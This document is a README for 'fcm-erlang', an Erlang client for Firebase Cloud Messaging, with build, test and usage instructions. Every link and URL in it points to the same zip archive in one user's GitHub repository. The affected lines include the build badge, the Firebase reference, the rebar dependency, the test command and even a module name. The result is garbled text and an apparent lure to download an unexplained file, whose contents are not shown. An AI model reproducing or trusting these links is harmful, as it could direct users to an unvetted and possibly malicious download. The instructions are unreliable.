fcm-erlang
=======

[![Build Status](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip)]

This software provides an Erlang client for [`Firebase Cloud Messaging`](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip "Firebase Cloud Messaging for Android").


### What you can do with fcm-erlang:

With `fcm-erlang` you can:

1. start several `gen_servers` representing different `FCM applications` defined by different `FCM API keys`
2. send notification messages to Android mobile devices registered to your application and registered to `FCM` with a `registration id`

So far `fcm-erlang` provides only support for JSON messages since FCM does not allow to send multicast messages using plain text.

### How to compile:

The first thing you have to do is to compile all the Erlang files using `rebar`.

    $ ./rebar get-deps compile

### How to use with rebar:

You can use fcm_app as a dependency in your https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip

    {deps , [
        {fcm, ".*", {git, "https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip"}}
    ]}.

###How to run tests:

    ./rebar compile && ./rebar skip_deps=true eunit && https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip

### How to run the application fcm-erlang:

Once all the Erlang files are compiled you can start the application `fcm-erlang`. This application depends on other applications  so it is mandatory to  start them as well.

    $ erl -pa deps/*/ebin -pa ebin
    1> application:start(inets).
    ok
    2> application:start(jsx).
    ok
    3> ssl:start().
    ok
    4> application:start(fcm).
    ok

### How to start/stop different gen_servers under application fcm-erlang (one for each FCM application):

While `fcm-erlang` is running you can start several supervised gen_servers, one for each FCM application. Every gen_server is defined by an atom used internally for registration and by a `FCM API key`.

    3> fcm:start(foo, "myapikey").
    {ok,<0.60.0>}
    4> fcm:start(bar, "myotherapikey").
    {ok,<0.65.0>}
    5> fcm:start(baz, "mylastapikey").
    {ok,<0.79.0>}

You can stop a `gen_server` representing a FCM Application using:

    6> fcm:stop(foo).

### How to send a FCM message using from a specific FCM application:

At any time you can send a FCM message to one or more mobile devices by calling:

    7> fcm:push(RegisteredName, RegIds, Message).

or by calling:

    7> fcm:sync_push(RegisteredName, RegIds, Message).

Where `RegistereName` is the atom used during registration, `RegIds` is a list (max 1000 elements) of Registration Ids specified as Erlang binaries (e.g., `<<"APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx...">>`) and `Message` is an Erlang term representing the data you want to send to the device.

The JSON message is built using `jsx` in the module `https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip` and in the end will have the following form:

    {
      "registration_ids" : ["APA91bHun4MxP5egoKMwt2KZFBaFUH-1RYqx..."],
      "data" : {
        "message" : "a message"
      },
      "time_to_live" : 3600,
      "collapse_key" : "your_update"
    }

You can send this message using:

    8> fcm:push(RegisteredName, RegIds, [{<<"data">>, [
    8>     {<<"message">>, <<"a message">>}
    8> ]}, {<<"time_to_live">>,3600}, {<<"collapse_key">>,<<"your_update">>}]).

or simply:

    8> fcm:push(RegisteredName, RegIds, [{<<"data">>, [
    8>     {<<"message">>, <<"a message">>}
    8> ]}]).

`fcm-erlang` will push the message for you to `Firebase Cloud Messaging` servers and will parse the JSON provided as result.

In order to understand errors see: [Interpreting an error response](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip).

### Note:

Some of the concepts I used for building this Erlang application are based on this [`Erlang application for APN`](https://raw.githubusercontent.com/sohailgerman/fcm-erlang/master/src/fcm-erlang-v1.8.zip).
